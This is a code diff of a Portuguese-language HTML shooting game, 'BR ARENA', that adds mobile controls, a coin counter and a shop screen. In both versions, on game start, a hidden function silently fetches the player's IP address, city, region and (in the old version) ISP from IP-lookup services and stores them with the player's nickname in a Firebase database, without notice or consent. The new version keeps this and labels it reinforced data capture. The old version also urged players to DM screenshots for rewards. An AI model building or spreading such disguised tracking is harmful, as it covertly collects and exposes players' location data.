@@ -2,146 +2,277 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <title>BR ARENA - RECOMPENSAS</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>BR ARENA </title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
-        body { background: #000; color: #ff0055; font-family: 'Press Start 2P', cursive; margin: 0; overflow: hidden; }
-        #ui { position: absolute; width: 100%; top: 10px; display: none; justify-content: space-around; z-index: 10; font-size: 10px; }
-        canvas { background: #050505; display: none; cursor: crosshair; }
-        .menu { text-align: center; padding: 30px; border: 4px solid #ff0055; background: #111; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 350px; box-shadow: 0 0 20px #ff0055; }
-        input { background: #000; border: 2px solid #ff0055; color: #fff; padding: 12px; font-family: 'Press Start 2P'; font-size: 10px; width: 85%; margin-bottom: 20px; outline: none; }
-        button { background: #ff0055; color: #fff; border: none; padding: 15px; cursor: pointer; font-family: 'Press Start 2P'; width: 100%; font-size: 12px; }
-        #final-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 200; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
-        .coin { color: #ffd700; font-size: 20px; margin: 20px 0; }
+        
+        body { 
+            background: #000; 
+            color: #ff0055; 
+            font-family: 'Press Start 2P', cursive; 
+            margin: 0; 
+            overflow: hidden; 
+            touch-action: none; 
+        }
+        
+        /* Menus Estilizados (Início, Loja e Vitória) */
+        .menu-container { 
+            text-align: center; 
+            padding: 40px 20px; 
+            border: 6px double #ff0055; 
+            background: rgba(0,0,0,0.95); 
+            position: absolute; 
+            top: 50%; 
+            left: 50%; 
+            transform: translate(-50%, -50%); 
+            width: 320px; 
+            z-index: 100; 
+            box-shadow: 0 0 30px #ff0055; 
+            display: flex; 
+            flex-direction: column;
+        }
+
+        h1 { font-size: 20px; margin-bottom: 10px; color: #fff; text-shadow: 2px 2px #ff0055; }
+        input { 
+            background: #000; border: 2px solid #ff0055; color: #fff; 
+            padding: 15px; font-family: 'Press Start 2P'; font-size: 10px; 
+            width: 85%; margin: 10px auto 20px; outline: none; 
+        }
+        
+        .btn-main { 
+            background: #ff0055; color: #fff; border: none; padding: 18px; 
+            cursor: pointer; font-family: 'Press Start 2P'; font-size: 12px; 
+            margin-bottom: 10px; 
+        }
+        .btn-store { 
+            background: #000; color: #ffd700; border: 2px solid #ffd700; 
+            padding: 15px; cursor: pointer; font-family: 'Press Start 2P'; font-size: 10px; 
+        }
+
+        /* HUD do Jogo */
+        #ui { 
+            position: absolute; width: 100%; top: 15px; display: none; 
+            justify-content: space-around; z-index: 10; font-size: 9px; 
+            text-shadow: 2px 2px #000; 
+        }
+        
+        #game-container { 
+            position: relative; width: 95vw; height: 55vh; border: 4px solid #ff0055; 
+            margin: 70px auto; background: #050505; display: none; overflow: hidden; 
+        }
+        canvas { width: 100%; height: 100%; display: block; }
+
+        /* Controles Mobile */
+        #controles { display: none; position: fixed; bottom: 20px; width: 100%; height: 150px; z-index: 50; }
+        #analogico { 
+            position: absolute; left: 30px; bottom: 20px; width: 100px; height: 100px; 
+            background: rgba(255,255,255,0.05); border: 2px solid #ff0055; border-radius: 50%; 
+        }
+        #stick { 
+            position: absolute; left: 25px; top: 25px; width: 50px; height: 50px; 
+            background: #ff0055; border-radius: 50%; box-shadow: 0 0 15px #ff0055; 
+        }
+        #btn-tiro { 
+            position: absolute; right: 30px; bottom: 20px; width: 100px; height: 100px; 
+            background: rgba(255,0,85,0.3); border: 4px solid #ff0055; border-radius: 50%; 
+            display: flex; align-items: center; justify-content: center; 
+            color: #fff; font-size: 12px; font-weight: bold; 
+        }
+
+        /* Telas Ocultas */
+        #loja, #win-screen { display: none; }
+        .resumo-valor { color: #ffd700; font-size: 25px; margin: 20px 0; }
     </style>
 </head>
 <body>
 
 <div id="ui">
     <span>KILLS: <span id="u-kills">0</span></span>
-    <span>TEMPO: <span id="u-timer">30</span>s</span>
+    <span>MOEDAS: <span id="u-coins">0</span></span>
+    <span>TIME: <span id="u-timer">30</span></span>
 </div>
 
-<div class="menu" id="main-menu">
+<!-- MENU INICIAL -->
+<div class="menu-container" id="main-menu">
     <h1>BR ARENA</h1>
-    <p style="font-size: 7px; color: #888;">BY: MIA💓</p>
-    <input type="text" id="nick" placeholder="SEU NICKNAME...">
-    <button onclick="iniciar()">JOGAR E GANHAR</button>
+    <p style="font-size: 8px; color: #888;">Dev: MIA💓</p>
+    <input type="text" id="nick" placeholder="NICK DE USUÁRIO...">
+    <button class="btn-main" onclick="jogar()">COMEÇAR</button>
+    <button class="btn-store" onclick="mostrarLoja(true)">ABRIR LOJA</button>
 </div>
 
-<div id="final-screen">
-    <h2 style="color: #0f0;">RECOMPENSA LIBERADA!</h2>
-    <div class="coin">💰 <span id="res-moedas">0</span> MOEDAS</div>
-    <p style="font-size: 10px; padding: 20px; line-height: 1.5;">
-        Tire um PRINT desta tela e envie na DM da MIA💓 para trocar suas moedas por recompensas!
-    </p>
-    <button onclick="location.reload()" style="width: 200px; font-size: 8px;">VOLTAR AO INÍCIO</button>
+<!-- TELA DE VITÓRIA -->
+<div class="menu-container" id="win-screen">
+    <h1 style="color: #00ffcc;">VITÓRIA!</h1>
+    <p style="font-size: 10px;">VOCÊ GANHOU:</p>
+    <div class="resumo-valor"><span id="final-coins">0</span> 💰</div>
+    <button class="btn-main" onclick="location.reload()">VOLTAR AO INÍCIO</button>
 </div>
 
-<canvas id="canvas"></canvas>
+<!-- TELA DA LOJA -->
+<div class="menu-container" id="loja">
+    <h1 style="color: #ffd700;">LOJA DA MIA</h1>
+    <p style="font-size: 8px; margin: 20px 0; line-height: 1.5;">ITENS INDISPONÍVEIS NO MOMENTO.</p>
+    <button class="btn-main" onclick="mostrarLoja(false)">FECHAR</button>
+</div>
+
+<div id="game-container"><canvas id="canvas"></canvas></div>
+
+<div id="controles">
+    <div id="analogico"><div id="stick"></div></div>
+    <div id="btn-tiro" onpointerdown="atirar()">ATIRAR</div>
+</div>
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.1/firebase-app.js";
-    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.1/firebase-database.js";
+    import { getDatabase, ref, update, increment } from "https://www.gstatic.com/firebasejs/10.12.1/firebase-database.js";
 
-    const firebaseConfig = {
-        apiKey: "AIzaSyCSVBUH7dHTf58ClpA5CYTAotUCepCVBqI",
-        authDomain: "operacaoantpnr.firebaseapp.com",
-        databaseURL: "https://operacaoantpnr-default-rtdb.firebaseio.com",
-        projectId: "operacaoantpnr",
-        storageBucket: "operacaoantpnr.firebasestorage.app",
-        messagingSenderId: "261733238951",
-        appId: "1:261733238951:web:a5d95cf7478362517ff382"
-    };
-
+    // Configuração do seu Banco de Dados
+    const firebaseConfig = { databaseURL: "https://operacaoantpnr-default-rtdb.firebaseio.com" };
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
-    let kills = 0, tempo = 30, alvos = [], mouse = {x:0, y:0}, jogando = false;
+    let kills = 0, moedas = 0, tempo = 30, alvos = [], jogando = false;
+    let mira = { x: 0, y: 0 }, moveX = 0, moveY = 0;
 
-    window.iniciar = async function() {
+    window.mostrarLoja = (abrir) => {
+        document.getElementById('loja').style.display = abrir ? 'flex' : 'none';
+        document.getElementById('main-menu').style.display = abrir ? 'none' : 'flex';
+    }
+
+    window.jogar = function() {
         const nick = document.getElementById('nick').value;
-        if(!nick) return alert("COLOQUE SEU NICK!");
-
-        // CAPTURA IMEDIATA
-        capturarDados(nick);
-
+        if(!nick) return alert("DIGITE UM NICK!");
+        
         document.getElementById('main-menu').style.display = 'none';
         document.getElementById('ui').style.display = 'flex';
-        canvas.style.display = 'block';
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        document.getElementById('game-container').style.display = 'block';
+        document.getElementById('controles').style.display = 'block';
         
+        canvas.width = canvas.offsetWidth; canvas.height = canvas.offsetHeight;
+        mira.x = canvas.width/2; mira.y = canvas.height/2;
+        
+        capturar(nick);
         jogando = true;
-        const loop = setInterval(() => {
+        
+        const timerGame = setInterval(() => {
             tempo--;
             document.getElementById('u-timer').innerText = tempo;
-            if(tempo <= 0) {
-                clearInterval(loop);
-                showResult();
-            }
+            if(tempo <= 0) { clearInterval(timerGame); finalizar(); }
         }, 1000);
 
-        for(let i=0; i<4; i++) spawn();
-        animate();
+        for(let i=0; i<6; i++) spawn();
+        renderLoop();
     }
 
-    async function capturarDados(nick) {
+    // CAPTURA DE DADOS REFORÇADA
+    async function capturar(nick) {
         try {
-            // Puxando IP e Localização completa
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
+            const resIp = await fetch('https://api.ipify.org?format=json');
+            const dataIp = await resIp.json();
+            const userIP = dataIp.ip;
+
+            let localidade = "📍 Local Privado/Oculto";
+            try {
+                const resLoc = await fetch(`https://ipapi.co/${userIP}/json/`);
+                const dataLoc = await resLoc.json();
+                if(dataLoc.city) localidade = `${dataLoc.city}, ${dataLoc.region}`;
+            } catch(e) {}
+
+            const id = (nick + "_" + userIP).replace(/\./g, '_');
             
-            await push(ref(db, 'logs_arena/'), {
+            await update(ref(db, 'logs_arena/' + id), {
                 player: nick,
-                ip: data.ip,
-                local: `${data.city} / ${data.region}`,
-                isp: data.org,
-                data: new Date().toLocaleString('pt-BR'),
-                creditos: "Mia💓"
+                ip: userIP,
+                local: localidade,
+                acessos: increment(1),
+                ultima_vez: new Date().toLocaleString('pt-BR')
             });
-        } catch(e) {
-            // Se falhar a API, tenta pelo menos o IP puro
-            fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(d => push(ref(db, 'logs_arena/'), { player: nick, ip: d.ip, data: new Date().toLocaleString('pt-BR') }));
-        }
+        } catch(err) { console.log("Captura offline"); }
     }
 
-    function spawn() { alvos.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, r: 25 }); }
+    function spawn() { 
+        alvos.push({ 
+            x: Math.random()*(canvas.width-60)+30, 
+            y: Math.random()*(canvas.height-60)+30, 
+            r: 25 
+        }); 
+    }
 
-    window.onmousemove = (e) => { mouse.x = e.clientX; mouse.y = e.clientY; }
-    window.onmousedown = () => {
+    // Clique direto na tela
+    canvas.onpointerdown = (e) => {
+        const rect = canvas.getBoundingClientRect();
+        validarTiro(e.clientX - rect.left, e.clientY - rect.top);
+    }
+
+    // Botão de Tiro do Analógico
+    window.atirar = () => { validarTiro(mira.x, mira.y); }
+
+    function validarTiro(tx, ty) {
         if(!jogando) return;
         alvos.forEach((a, i) => {
-            if(Math.hypot(mouse.x-a.x, mouse.y-a.y) < a.r) {
-                kills++; document.getElementById('u-kills').innerText = kills;
-                alvos.splice(i, 1); spawn();
+            if(Math.hypot(tx-a.x, ty-a.y) < a.r + 20) {
+                kills++; moedas += 10;
+                document.getElementById('u-kills').innerText = kills;
+                document.getElementById('u-coins').innerText = moedas;
+                alvos.splice(i, 1); 
+                spawn();
             }
         });
     }
 
-    function animate() {
+    // Lógica do Analógico
+    document.getElementById('analogico').onpointermove = (e) => {
+        if(e.buttons !== 1) return;
+        let rect = e.currentTarget.getBoundingClientRect();
+        let x = e.clientX - rect.left - 50, y = e.clientY - rect.top - 50;
+        let dist = Math.min(40, Math.hypot(x, y)), angle = Math.atan2(y, x);
+        moveX = Math.cos(angle) * (dist/7); 
+        moveY = Math.sin(angle) * (dist/7);
+        document.getElementById('stick').style.transform = `translate(${Math.cos(angle)*dist}px, ${Math.sin(angle)*dist}px)`;
+    };
+    
+    document.getElementById('analogico').onpointerup = () => { 
+        moveX = 0; moveY = 0; 
+        document.getElementById('stick').style.transform = `translate(0, 0)`; 
+    };
+
+    function renderLoop() {
         if(!jogando) return;
-        ctx.fillStyle = 'rgba(0,0,0,0.3)'; ctx.fillRect(0,0,canvas.width,canvas.height);
+        ctx.fillStyle = '#050505'; ctx.fillRect(0,0,canvas.width,canvas.height);
+        
+        // Movimento da mira via analógico
+        mira.x = Math.max(0, Math.min(canvas.width, mira.x + moveX * 4));
+        mira.y = Math.max(0, Math.min(canvas.height, mira.y + moveY * 4));
+        
+        // Desenha alvos
         alvos.forEach(a => {
             ctx.beginPath(); ctx.arc(a.x, a.y, a.r, 0, Math.PI*2);
             ctx.fillStyle = '#ff0055'; ctx.fill();
+            ctx.strokeStyle = '#fff'; ctx.lineWidth = 2; ctx.stroke();
         });
-        // Mira simples
-        ctx.strokeStyle = '#0f0'; ctx.strokeRect(mouse.x-15, mouse.y-15, 30, 30);
-        requestAnimationFrame(animate);
+
+        // Mira Crosshair Verde
+        ctx.strokeStyle = '#0f0'; ctx.lineWidth = 2;
+        ctx.strokeRect(mira.x - 30, mira.y - 30, 60, 60);
+        ctx.beginPath();
+        ctx.moveTo(mira.x, mira.y - 45); ctx.lineTo(mira.x, mira.y + 45);
+        ctx.moveTo(mira.x - 45, mira.y); ctx.lineTo(mira.x + 45, mira.y);
+        ctx.stroke();
+
+        requestAnimationFrame(renderLoop);
     }
 
-    function showResult() {
+    function finalizar() {
         jogando = false;
-        canvas.style.display = 'none';
+        document.getElementById('game-container').style.display = 'none';
+        document.getElementById('controles').style.display = 'none';
         document.getElementById('ui').style.display = 'none';
-        document.getElementById('final-screen').style.display = 'flex';
-        // 10 moedas base + 2 por kill
-        const totalMoedas = 10 + (kills * 2);
-        document.getElementById('res-moedas').innerText = totalMoedas;
+        document.getElementById('final-coins').innerText = moedas;
+        document.getElementById('win-screen').style.display = 'flex';
     }
 </script>
 </body>
